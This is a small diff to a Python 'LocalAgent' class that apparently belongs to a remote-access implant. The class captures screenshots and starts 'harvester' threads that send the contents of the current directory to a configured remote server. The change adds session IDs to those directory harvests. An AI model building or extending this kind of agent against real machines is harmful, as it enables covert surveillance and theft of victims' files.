@@ -296,6 +296,7 @@ class LocalAgent:
 	outboundLooperDict = {}
 	inboundLooperDict = {}
 	directoryHarvesterDict = {}
+	next_harvest_session_id = 1
 
 	def takeScreenshot(self, postScreenshot):
 		image = pyautogui.screenshot()
@@ -344,7 +345,10 @@ class LocalAgent:
 
 	def postHarvest(self, cmd_output, harvestType):
 		raise NotImplementedError("Please Implement this method")
-        
+
+	def postDirHarvest(self, content, session_id):
+		raise NotImplementedError("Please Implement this method")
+
 	def postScreenshot(self, cmd_output):
 		raise NotImplementedError("Please Implement this method")
 
@@ -376,9 +380,10 @@ class LocalAgent:
 		return sys.executable + " " + self.getScriptName()
 
 	def harvestCurrentDirectory(self):
-		harvester = DirectoryHarvester(os.path.abspath(os.getcwd()), self, self.harvester_server, self.harvester_port)
+		harvester = DirectoryHarvester(os.path.abspath(os.getcwd()), self, self.harvester_server, self.harvester_port, self.next_harvest_session_id, True)
 		harvester.start()
 		self.directoryHarvesterDict[os.path.abspath(os.getcwd())] = harvester
+		self.next_harvest_session_id += 1
 		self.postResponse("Started Harvest: " + os.path.abspath(os.getcwd()))
 
 	def listActiveHarvests(self):
